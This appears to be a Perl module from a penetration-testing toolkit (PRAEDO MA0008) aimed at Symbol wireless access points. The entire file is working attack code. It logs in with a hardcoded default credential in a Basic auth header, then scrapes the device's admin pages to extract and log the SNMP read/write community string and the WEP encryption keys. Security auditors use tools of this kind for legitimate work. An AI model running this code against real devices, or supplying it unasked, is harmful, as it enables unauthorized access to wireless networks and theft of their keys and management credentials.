# Symbol Access Point default password test, enumerate snmp and WEP key 
#
#
#
######################################################
#              PRAEDO Module #MA0008                 #
#                                                    #
#                                                    #
#                Chris Teodorski                     #
#                    aka                             #
#                   __  _                            #
#      __ __ _ _ _ /  \| |__  ___ __ _ _ _  ___      #
#     / _/ _` | ' \ () | '_ \/ -_) _` | ' \(_-<      # 
#     \__\__,_|_||_\__/|_.__/\___\__,_|_||_/__/      #
#                                                    #
#                                                    #
######################################################              

package MA0008;
sub MA0008
{


# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to Verify default credentials on Symbol Access Point and display snmp and wep $TARGET : JOB MA0008**********\n";
print OUTFILE "\n**********Attempting to verify default credentials on Symbol Access Point and display snmp and wep $TARGET : JOB MA0008**********\n";


my $browser = LWP::UserAgent->new(timeout => 60);
$browser->default_header(Authorization=> "Basic OlN5bWJvbA==");

my $response = $browser->get("http$web://$TARGET:$PORTS/_RWCommunityEntry.htm");

my $content = $response->content;

if ($content =~ /Authorization Required/)
{
	print "The module failed. The username and password is not the default\n";
	print OUTFILE "The module failed. The username and password is not the default\n";
}
else	
{

	my $html = HTML::TagParser->new($content);
	my @list = $html->getElementsByTagName( "input");

	foreach my $elem(@list)
		{
		  my $text1 = $elem->getAttribute("name");
		  my $text2 = $elem->getAttribute("value");
	
			if ($text1 =~ /apRWCommunityName/)
			{
			 print "SUCCESS : SNMP Read/Write Community String Found: "; 
			 print $text2 . "\n";
			 
			 print OUTFILE "SUCCESS : SNMP Read/Write Community String Found: ";
                         print OUTFILE $text2 . "\n";

			}
		}
			

	$browser->default_header(Authorization=> "Basic OlN5bWJvbA==");
	$response = $browser->get("http$web://$TARGET:$PORTS/_SecuritySetup.htm");

	$content = $response->content;
	$html = HTML::TagParser->new($content);
	@list = $html->getElementsByTagName( "input");
	foreach my $elem(@list)
        	{
          	my $text1 = $elem->getAttribute("name");
          	my $text2 = $elem->getAttribute("value");

                if ($text1 =~ /EncryptKey[\d]/)
                        {
                         print "SUCCESS : WEP Key found: ";
                         print $text2 . "\n";
                         print OUTFILE "SUCCESS : WEP Key found: ";
                         print OUTFILE $text2 . "\n";

                        }
        	}





}
close(OUTFILE);
}
1;
